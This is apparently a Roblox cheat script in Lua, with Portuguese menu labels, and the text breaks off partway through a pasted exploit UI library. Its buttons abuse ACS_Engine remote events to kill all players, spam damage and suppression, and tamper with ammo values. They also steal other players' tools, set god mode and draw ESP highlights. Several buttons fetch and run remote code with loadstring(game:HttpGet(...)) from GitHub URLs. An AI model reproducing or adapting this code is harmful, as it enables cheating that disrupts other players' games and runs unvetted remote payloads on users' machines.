ESP"K.TextColor3=Color3.fromRGB(255,255,255)K.TextSize=15.000;K.TextWrapped=true;L.Parent=b;L.BackgroundColor3=Color3.fromRGB(255,255,255)L.BackgroundTransparency=1.000;L.BorderColor3=Color3.fromRGB(0,0,0)L.BorderSizePixel=0;L.Position=UDim2.new(0.924564779,0,0.0285714287,0)L.Size=UDim2.new(0,29,0,27)L.Font=Enum.Font.Unknown;L.Text="X"L.TextColor3=Color3.fromRGB(243,0,0)L.TextScaled=true;L.TextSize=14.000;L.TextWrapped=true;M.Name="LocalPlayerFrame"M.Parent=b;M.Active=true;M.BackgroundColor3=Color3.fromRGB(34,34,34)M.BorderColor3=Color3.fromRGB(0,0,0)M.BorderSizePixel=0;M.Position=UDim2.new(0.214700252,0,0.139682546,0)M.Size=UDim2.new(0,405,0,263)M.Visible=false;M.ScrollBarImageTransparency=1.000;N.Parent=M;N.BackgroundColor3=Color3.fromRGB(255,255,255)N.BackgroundTransparency=1.000;N.BorderColor3=Color3.fromRGB(0,0,0)N.BorderSizePixel=0;N.Position=UDim2.new(0.0219999999,0,0.0199999996,0)N.Size=UDim2.new(0,387,0,34)O.Parent=N;O.BackgroundColor3=Color3.fromRGB(48,48,48)O.BorderColor3=Color3.fromRGB(0,0,0)O.BorderSizePixel=0;O.Position=UDim2.new(-2.36570372e-07,0,0,0)O.Size=UDim2.new(0,378,0,33)O.Font=Enum.Font.Gotham;O.Text="Reset Character"O.TextColor3=Color3.fromRGB(255,255,255)O.TextSize=14.000;P.Parent=O;Q.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;Q.Color=Color3.fromRGB(79,79,79)Q.Parent=O;R.Parent=N;R.SortOrder=Enum.SortOrder.LayoutOrder;R.Padding=UDim.new(0,5)S.Parent=N;S.BackgroundColor3=Color3.fromRGB(48,48,48)S.BorderColor3=Color3.fromRGB(0,0,0)S.BorderSizePixel=0;S.Position=UDim2.new(-2.36570372e-07,0,0,0)S.Size=UDim2.new(0,378,0,33)S.Font=Enum.Font.Gotham;S.Text="God Mode"S.TextColor3=Color3.fromRGB(255,255,255)S.TextSize=14.000;T.Parent=S;U.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;U.Color=Color3.fromRGB(79,79,79)U.Parent=S;V.Parent=N;V.BackgroundColor3=Color3.fromRGB(40,40,40)V.BorderColor3=Color3.fromRGB(0,0,0)V.BorderSizePixel=0;V.Position=UDim2.new(0,0,2.2352941,0)V.Size=UDim2.new(0,200,0,33)V.Font=Enum.Font.Gotham;V.PlaceholderText="Walkspeed"V.Text=""V.TextColor3=Color3.fromRGB(255,255,255)V.TextSize=16.000;W.Parent=V;X.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;X.Color=Color3.fromRGB(79,79,79)X.Parent=V;Y.Parent=V;Y.BackgroundColor3=Color3.fromRGB(48,48,48)Y.BorderColor3=Color3.fromRGB(0,0,0)Y.BorderSizePixel=0;Y.Position=UDim2.new(1.02999997,0,0,0)Y.Size=UDim2.new(0,172,0,33)Y.Font=Enum.Font.Gotham;Y.Text="Change"Y.TextColor3=Color3.fromRGB(255,255,255)Y.TextSize=14.000;Z.Parent=Y;_.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;_.Color=Color3.fromRGB(79,79,79)_.Parent=Y;a0.Parent=N;a0.BackgroundColor3=Color3.fromRGB(40,40,40)a0.BorderColor3=Color3.fromRGB(0,0,0)a0.BorderSizePixel=0;a0.Position=UDim2.new(0,0,2.2352941,0)a0.Size=UDim2.new(0,200,0,33)a0.Font=Enum.Font.Gotham;a0.PlaceholderText="JumpPower"a0.Text=""a0.TextColor3=Color3.fromRGB(255,255,255)a0.TextSize=16.000;a1.Parent=a0;a2.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;a2.Color=Color3.fromRGB(79,79,79)a2.Parent=a0;a3.Parent=a0;a3.BackgroundColor3=Color3.fromRGB(48,48,48)a3.BorderColor3=Color3.fromRGB(0,0,0)a3.BorderSizePixel=0;a3.Position=UDim2.new(1.02999997,0,0,0)a3.Size=UDim2.new(0,172,0,33)a3.Font=Enum.Font.Gotham;a3.Text="Change"a3.TextColor3=Color3.fromRGB(255,255,255)a3.TextSize=14.000;a4.Parent=a3;a5.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;a5.Color=Color3.fromRGB(79,79,79)a5.Parent=a3;a6.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;a6.Color=Color3.fromRGB(79,79,79)a6.Parent=b;local function a7()local a8=Instance.new('Script',f)local a9=a8.Parent;local aa=10;wait(1)local ab=1;while ab<=255 do a9.TextColor3=Color3.new(ab/255,0/255,0/255)ab=ab+aa;wait()end;while true do ab=1;while ab<=255 do a9.TextColor3=Color3.new(255/255,ab/255,0/255)ab=ab+aa;wait()end;ab=1;while ab<=255 do a9.TextColor3=Color3.new(255/255-ab/255,255/255,0/255)ab=ab+aa;wait()end;ab=1;while ab<=255 do a9.TextColor3=Color3.new(0/255,255/255,ab/255)ab=ab+aa;wait()end;ab=1;while ab<=255 do a9.TextColor3=Color3.new(0/255,255/255-ab/255,255/255)ab=ab+aa;wait()end;ab=1;while ab<=255 do a9.TextColor3=Color3.new(ab/255,0/255,255/255)ab=ab+aa;wait()end;ab=1;while ab<=255 do a9.TextColor3=Color3.new(255/255,0/255,255/255-ab/255)ab=ab+aa;wait()end;while ab<=255 do a9.TextColor3=Color3.new(255/255-ab/255,0/255,0/255)ab=ab+aa;wait()end end end;coroutine.wrap(a7)()local function ac()local a8=Instance.new('LocalScript',i)a8.Parent.MouseButton1Click:Connect(function()for ad,ae in game.Players:GetDescendants()do if ae:IsA("Tool")then ae.Parent=game.Players.LocalPlayer.Backpack end end end)end;coroutine.wrap(ac)()local function af()local a8=Instance.new('LocalScript',i)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(af)()local function ar()local a8=Instance.new('LocalScript',m)a8.Parent.MouseButton1Click:Connect(function()for ad,ae in game.Players:GetDescendants()do if ae:IsA("Tool")then ae.Parent=game.Players.LocalPlayer.Backpack end end;while task.wait()do for ad=1,30 do game:GetService("ReplicatedStorage")["ACS_Engine"].Events.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))end end end)end;coroutine.wrap(ar)()local function as()local a8=Instance.new('LocalScript',m)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(as)()local function at()local a8=Instance.new('LocalScript',p)a8.Parent.MouseButton1Click:Connect(function()for ad,ae in game.Players:GetDescendants()do if ae:IsA("Tool")then ae:Clone()ae.Parent=game.Players.LocalPlayer.Backpack end end;while task.wait()do for au,av in next,game.Players:GetPlayers()do game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(av,666,666,666)end end end)end;coroutine.wrap(at)()local function aw()local a8=Instance.new('LocalScript',p)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(aw)()local function ax()local a8=Instance.new('LocalScript',s)a8.Parent.MouseButton1Click:Connect(function()local ay=require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)ay.AntiBunnyHop=false end)end;coroutine.wrap(ax)()local function az()local a8=Instance.new('LocalScript',s)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(az)()local function aA()local a8=Instance.new('LocalScript',b)for ad,ae in a8.Parent:GetDescendants()do if ae:IsA("TextButton")then ae.AutoButtonColor=false end end;local aB=game:GetService("UserInputService")local aC=game:GetService("RunService")local aD=a8.Parent;local aE;local aF;local aG;local aH;function Lerp(aI,aJ,aK)return aI+(aJ-aI)*aK end;local aL;local aM;local aN=8;function Update(aO)if not aH then return end;if not aE and aM then aD.Position=UDim2.new(aH.X.Scale,Lerp(aD.Position.X.Offset,aM.X.Offset,aO*aN),aH.Y.Scale,Lerp(aD.Position.Y.Offset,aM.Y.Offset,aO*aN))return end;local aP=aL-aB:GetMouseLocation()local aQ=aH.X.Offset-aP.X;local aR=aH.Y.Offset-aP.Y;aM=UDim2.new(aH.X.Scale,aQ,aH.Y.Scale,aR)aD.Position=UDim2.new(aH.X.Scale,Lerp(aD.Position.X.Offset,aQ,aO*aN),aH.Y.Scale,Lerp(aD.Position.Y.Offset,aR,aO*aN))end;aD.InputBegan:Connect(function(aS)if aS.UserInputType==Enum.UserInputType.MouseButton1 or aS.UserInputType==Enum.UserInputType.Touch then aE=true;aG=aS.Position;aH=aD.Position;aL=aB:GetMouseLocation()aS.Changed:Connect(function()if aS.UserInputState==Enum.UserInputState.End then aE=false end end)end end)aD.InputChanged:Connect(function(aS)if aS.UserInputType==Enum.UserInputType.MouseMovement or aS.UserInputType==Enum.UserInputType.Touch then aF=aS end end)aC.Heartbeat:Connect(Update)end;coroutine.wrap(aA)()local function aT()local a8=Instance.new('LocalScript',y)a8.Parent.MouseButton1Click:Connect(function()a8.Parent.Parent.Parent.HunterFrame.Visible=true;a8.Parent.Parent.Parent.VisualsFrame.Visible=false;a8.Parent.Parent.Parent.LocalPlayerFrame.Visible=false end)end;coroutine.wrap(aT)()local function aU()local a8=Instance.new('LocalScript',z)a8.Parent.MouseButton1Click:Connect(function()a8.Parent.Parent.Parent.HunterFrame.Visible=false;a8.Parent.Parent.Parent.LocalPlayerFrame.Visible=true;a8.Parent.Parent.Parent.VisualsFrame.Visible=false end)end;coroutine.wrap(aU)()local function aV()local a8=Instance.new('LocalScript',A)a8.Parent.MouseButton1Click:Connect(function()a8.Parent.Parent.Parent.HunterFrame.Visible=false;a8.Parent.Parent.Parent.LocalPlayerFrame.Visible=false;a8.Parent.Parent.Parent.VisualsFrame.Visible=true end)end;coroutine.wrap(aV)()local function aW()local a8=Instance.new('LocalScript',E)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(aW)()local function aX()local a8=Instance.new('LocalScript',E)local aY=a8.Parent.ImageButton:GetAttribute("IsChecked")local aZ=game:GetService("Players")local a_=game.Players.LocalPlayer;local aZ=game.Players;local function b0()for ad,a_ in pairs(aZ:GetPlayers())do if a_~=aZ.LocalPlayer then local b1=a_.Character;if b1 then if b1:FindFirstChildWhichIsA("Highlight")then b1:FindFirstChildWhichIsA("Highlight"):Destroy()end;local b2=Instance.new("Highlight")b2.FillColor=Color3.new(1,1,1)b2.FillTransparency=0.6;b2.Parent=b1 end end end end;local function b3()for ad,a_ in pairs(aZ:GetPlayers())do if a_~=aZ.LocalPlayer then local b1=a_.Character;if b1 then if b1:FindFirstChildWhichIsA("Highlight")then b1:FindFirstChildWhichIsA("Highlight"):Destroy()end end end end end;local function b2(b4)local b5=game.Players:FindFirstChild(b4)if b5 then local b2=Instance.new("Highlight")b2.FillColor=Color3.new(1,1,1)b2.FillTransparency=0.6;b2.Parent=b5.Character end end;a8.Parent.MouseButton1Click:Connect(function()if aY==false then aY=true;b0()game.Players.PlayerAdded:Connect(function(av)b2(av)end)a8.Parent.ImageButton.Frame:TweenSize(UDim2.new(0,30,0,27),'Out','Quint',0.4)game:GetService("TweenService"):Create(a8.Parent.ImageButton.Frame,TweenInfo.new(0.3),{ImageTransparency=0}):Play()game:GetService("TweenService"):Create(a8.Parent.ImageButton,TweenInfo.new(0.3),{BackgroundColor3=Color3.fromRGB(255,0,0)}):Play()else aY=false;b3()a8.Parent.ImageButton.Frame:TweenSize(UDim2.new(0,0,0,0),'Out','Quint',0.4)game:GetService("TweenService"):Create(a8.Parent.ImageButton.Frame,TweenInfo.new(0.3),{ImageTransparency=1}):Play()game:GetService("TweenService"):Create(a8.Parent.ImageButton,TweenInfo.new(0.3),{BackgroundColor3=Color3.fromRGB(72,72,72)}):Play()end end)end;coroutine.wrap(aX)()local function b6()local a8=Instance.new('LocalScript',L)a8.Parent.MouseButton1Click:Connect(function()a8.Parent.Parent.Parent:Destroy()end)end;coroutine.wrap(b6)()local function b7()local a8=Instance.new('LocalScript',O)a8.Parent.MouseButton1Click:Connect(function()game.Players.LocalPlayer.Character.Humanoid.Health=0 end)end;coroutine.wrap(b7)()local function b8()local a8=Instance.new('LocalScript',O)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(b8)()local function b9()local a8=Instance.new('LocalScript',S)a8.Parent.MouseButton1Click:Connect(function()game.Players.LocalPlayer.Character.Humanoid.MaxHealth=999999;game.Players.LocalPlayer.Character.Humanoid.Health=999999 end)end;coroutine.wrap(b9)()local function ba()local a8=Instance.new('LocalScript',S)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(ba)()local function bb()local a8=Instance.new('LocalScript',Y)a8.Parent.MouseButton1Click:Connect(function()print(a8.Parent.Parent.Text)local b4=tonumber(a8.Parent.Parent.Text)game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=b4 end)end;coroutine.wrap(bb)()local function bc()local a8=Instance.new('LocalScript',V)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(bc)()local function bd()local a8=Instance.new('LocalScript',a3)a8.Parent.MouseButton1Click:Connect(function()print(a8.Parent.Parent.Text)local b4=tonumber(a8.Parent.Parent.Text)game.Players.LocalPlayer.Character.Humanoid.JumpPower=b4 end)end;coroutine.wrap(bd)()local function be()local a8=Instance.new('LocalScript',a0)local ag=a8.Parent;ag.AutoButtonColor=false;local ah=false;local ai=7;local aj=0.24;local ak=Enum.EasingStyle.Quad;local al=-10/255;local am=-20/255;local an=a8.Parent.BackgroundColor3;local ao=game:GetService("TweenService")local ap;local aq;ag.MouseEnter:Connect(function()ap=true;ao:Create(ag,TweenInfo.new(aj,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.new(0.219608,0.219608,0.219608)}):Play()if ah then print('Enter '..tostring(Color3.fromRGB(an.R-al,an.G-al,an.B-al)))end end)ag.MouseLeave:Connect(function()ap=false;ao:Create(ag,TweenInfo.new(aj/1.2,ak,Enum.EasingDirection.In),{BackgroundColor3=an}):Play()end)ag.MouseButton1Click:Connect(function()ao:Create(ag,TweenInfo.new(aj/1.8,ak,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(56,56,56)}):Play()if ah then print('MouseButton1Up '..tostring(Color3.fromRGB(an.R-am,an.G-am,an.B-am)))end end)if ah then print("UI BUTTON EFFECT LOADED!")end end;coroutine.wrap(be)()
          end               
        })
local Section = JogadorTab:AddSection({
	Name = "Jogador"
})
JogadorTab:AddButton({
	Name = "God Mode",
	Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character.Humanoid
         
        print('Godmode working.')
         
        Humanoid.MaxHealth = 999999
        Humanoid.Health = Humanoid.MaxHealth / 2
         
        Humanoid.HealthChanged:connect(function()
            if Humanoid.Health < 10 then
                Humanoid.Health = Humanoid.MaxHealth
            end
        end)
  	end    
})
JogadorTab:AddButton({
	Name = "Stamina Inf.",
	Callback = function()
        local function SetInfiniteStamina(player)
            local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.MaxHealth = math.huge
                humanoid.Health = math.huge
            end
        end
        
        -- Conectar a função ao evento de entrada do jogador
        game.Players.PlayerAdded:Connect(function(player)
            player.CharacterAdded:Connect(function()
                SetInfiniteStamina(player)
            end)
        end)
  	end    
})
JogadorTab:AddButton({
	Name = "Anti Ragdoll",
	Callback = function()
        spawn(function()
            while game:GetService("RunService").Heartbeat:Wait() do
                local chr = game.Players.LocalPlayer.Character
         
                for _,v in pairs(chr:GetChildren()) do
                    if v:IsA("BallSocketConstraint") or v:IsA("HingeConstraint") or v.Name == "Controls" or v.Name == "Local Ragdoll" or v.Name == "State Handler" or v.Name == "FirstPerson" or v.Name == "FakeAdmin" then
                        v:Destroy()
                    end
                end
            end
        end)
    end
        })
        JogadorTab:AddButton({
            Name = "Auto JJs",
            Callback = function()
                _G.Jump = true 
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/GameLeaks2/RobloxScripts/main/AUTO-JJS%20ALL%20EB.lua"),true))()
              end  
            }) 
KillTab:AddButton({
	Name = "Kill All Acs - Precisa de arma",
	Callback = function()
      		--while wait() do
    local DR = game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage
 
    for PlayerIndex,GivenPlayer in pairs(game.Players:GetPlayers()) do
        local Char = GivenPlayer.Character
        DR:FireServer(Char.Humanoid,Char.Humanoid.MaxHealth,0,0)
    end
  	end
})
ArmaTab:AddButton({
	Name = "Remover Armas",
	Callback = function()
        local player = game:GetService("Players").LocalPlayer
        local backpack = player.Backpack

        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                item:Destroy()
            end
        end
		end
})
ArmaTab:AddButton({
	Name = "RCM (ACS Modded)",
	Callback = function()
        local l = {
            NumberValue = -math.huge,
            IntValue = -math.huge,
            BoolValue = true,
            StringValue = "Pedroxz"
        }
        
        local r = game:GetService('ReplicatedStorage')['ACS_Engine'].Events.RepAmmo
        for i,v in next, game:GetDescendants() do
            if v.ClassName:match("Value") then
                r:FireServer({
                    RepValues = {
                       StoredAmmo = v
                    }
                }, nil, l[v.ClassName])
            end
        end
  	end        
})          
        ArmaTab:AddButton({
            Name = "Aimbot Bypass",
            Callback = function()
                loadstring(game:HttpGet(('https://raw.githubusercontent.com/Exunys/Aimbot-V2/main/Resources/Scripts/Main.lua'),true))()
                
              end                           
})          
ArmaTab:AddButton({
	Name = "Aimbot By Pedroxz",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/pedroxzytbhypee/PvpRobloxTroll/main/README.md"))()
	end
})   
ArmaTab:AddButton({
	Name = "Aimbot Mobile",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pedroxz63/PedroxzAIMBOT/main/README.md", true))()
  	end    
})
ArmaTab:AddButton({
	Name = "Aimbot Fov Esp",
	Callback = function()
      	
local assets = {6183930112, 6071575925, 6071579801, 6073763717, 3570695787, 5941353943, 4155801252, 2454009026, 5553946656, 4155801252, 4918373417, 3570695787, 2592362371}
local cprovider = Game:GetService"ContentProvider"
for _, v in next, assets do
	cprovider:Preload("rbxassetid://" .. v)
end

repeat wait() until game:IsLoaded()

-- the rewrite was lost, this was the latest version of uwuware I could find
-- last time this was modified before being discontinued was around October 2021, so most of this shit's probably obsolete (USE AT YOUR OWN RISK!!!)
-- there are a lot of shitty methods here that were never cleaned up, a lot of shitty organization and shitty code in general
-- anyway, enjoy trying to make sense out of any of this


-- if you're just looking to get the library for whatever reason, just copy everything from below till you see LIBRARY END
pcall(function()
	--LIBRARY START
	--Services
	getgenv().runService = game:GetService"RunService"
	getgenv().textService = game:GetService"TextService"
	getgenv().inputService = game:GetService"UserInputService"
	getgenv().tweenService = game:GetService"TweenService"

	if getgenv().library then
		getgenv().library:Unload()
	end

	local library = {design = getgenv().design == "kali" and "kali" or "uwuware", tabs = {}, draggable = true, flags = {}, title = "uwuware", open = false, mousestate = inputService.MouseIconEnabled, popup = nil, instances = {}, connections = {}, options = {}, notifications = {}, tabSize = 0, theme = {}, foldername = "uw_configs", fileext = ".uw"}
	getgenv().library = library

	--Locals
	local dragging, dragInput, dragStart, startPos, dragObject

	local blacklistedKeys = { --add or remove keys if you find the need to
		Enum.KeyCode.Unknown,Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.KeyCode.Slash,Enum.KeyCode.Tab,Enum.KeyCode.Escape
	}
	local whitelistedMouseinputs = { --add or remove mouse inputs if you find the need to
		Enum.UserInputType.MouseButton1,Enum.UserInputType.MouseButton2,Enum.UserInputType.MouseButton3
	}

	--Functions
	library.round = function(num, bracket)
		if typeof(num) == "Vector2" then
			return Vector2.new(library.round(num.X), library.round(num.Y))
		elseif typeof(num) == "Vector3" then
			return Vector3.new(library.round(num.X), library.round(num.Y), library.round(num.Z))
		elseif typeof(num) == "Color3" then
			return library.round(num.r * 255), library.round(num.g * 255), library.round(num.b * 255)
		else
			return num - num % (bracket or 1);
		end
	end

	--From: https://devforum.roblox.com/t/how-to-create-a-simple-rainbow-effect-using-tweenService/221849/2
	local chromaColor
	spawn(function()
		while library and wait() do
			chromaColor = Color3.fromHSV(tick() % 6 / 6, 1, 1)
		end
	end)

	function library:Create(class, properties)
		properties = properties or {}
		if not class then return end
		local a = class == "Square" or class == "Line" or class == "Text" or class == "Quad" or class == "Circle" or class == "Triangle"
		local t = a and Drawing or Instance
		local inst = t.new(class)
		for property, value in next, properties do
			inst[property] = value
		end
		table.insert(self.instances, {object = inst, method = a})
		return inst
	end

	function library:AddConnection(connection, name, callback)
		callback = type(name) == "function" and name or callback
		connection = connection:connect(callback)
		if name ~= callback then
			self.connections[name] = connection
		else
			table.insert(self.connections, connection)
		end
		return connection
	end

	function library:Unload()
		inputService.MouseIconEnabled = self.mousestate
		for _, c in next, self.connections do
			c:Disconnect()
		end
		for _, i in next, self.instances do
			if i.method then
				pcall(function() i.object:Remove() end)
			else
				i.object:Destroy()
			end
		end
		for _, o in next, self.options do
			if o.type == "toggle" then
				coroutine.resume(coroutine.create(o.SetState, o))
			end
		end
		library = nil
		getgenv().library = nil
	end

	function library:LoadConfig(config)
		if table.find(self:GetConfigs(), config) then
			local Read, Config = pcall(function() return game:GetService"HttpService":JSONDecode(readfile(self.foldername .. "/" .. config .. self.fileext)) end)
			Config = Read and Config or {}
			for _, option in next, self.options do
				if option.hasInit then
					if option.type ~= "button" and option.flag and not option.skipflag then
						if option.type == "toggle" then
							spawn(function() option:SetState(Config[option.flag] == 1) end)
						elseif option.type == "color" then
							if Config[option.flag] then
								spawn(function() option:SetColor(Config[option.flag]) end)
								if option.trans then
									spawn(function() option:SetTrans(Config[option.flag .. " Transparency"]) end)
								end
							end
						elseif option.type == "bind" then
							spawn(function() option:SetKey(Config[option.flag]) end)
						else
							spawn(function() option:SetValue(Config[option.flag]) end)
						end
					end
				end
			end
		end
	end

	function library:SaveConfig(config)
		local Config = {}
		if table.find(self:GetConfigs(), config) then
			Config = game:GetService"HttpService":JSONDecode(readfile(self.foldername .. "/" .. config .. self.fileext))
		end
		for _, option in next, self.options do
			if option.type ~= "button" and option.flag and not option.skipflag then
